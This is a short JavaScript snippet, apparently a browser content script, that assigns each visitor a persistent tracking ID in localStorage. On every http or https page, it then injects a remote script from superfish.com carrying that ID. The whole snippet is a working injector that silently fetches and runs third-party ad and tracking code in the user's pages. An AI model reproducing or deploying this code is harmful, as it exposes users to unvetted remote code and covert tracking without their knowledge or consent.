(function(){

    var getUUID = function(){
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
            return v.toString(16);
        }).toUpperCase();
    };

    function loadScript(url, callback)
    {
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;

        // then bind the event to the callback function
        // there are several events for cross browser compatibility
        script.onreadystatechange = callback;
        script.onload = callback;

        // fire the loading
        head.appendChild(script);
    }



    function buildUrl (baseUrl,dlsource,userId,ctid){
        return baseUrl + '?dlsource=' + dlsource + '&userId=' + userId + '&CTID=' + ctid;
    }
    var dlsource = 'ooktsmf';
    var userId = localStorage.getItem('uuid');

    if(!userId){
        userId = getUUID();
        localStorage.setItem('uuid',userId);
    }

    var ctid = 'efg';

    if(document.URL.indexOf('https') == 0){
        // inject https https://www.superfish.com/ws/sf_main.jsp?dlsource=xyz&userId=abc&CTID=efg;
        loadScript(buildUrl('https://www.superfish.com/ws/sf_main.jsp',dlsource,userId,ctid));

    }else if (document.URL.indexOf('http') == 0){
        // inject http http://www.superfish.com/ws/sf_main.jsp?dlsource=xyz&userId=abc&CTID=efg;
        loadScript(buildUrl('http://www.superfish.com/ws/sf_main.jsp',dlsource,userId,ctid));

    }


})();
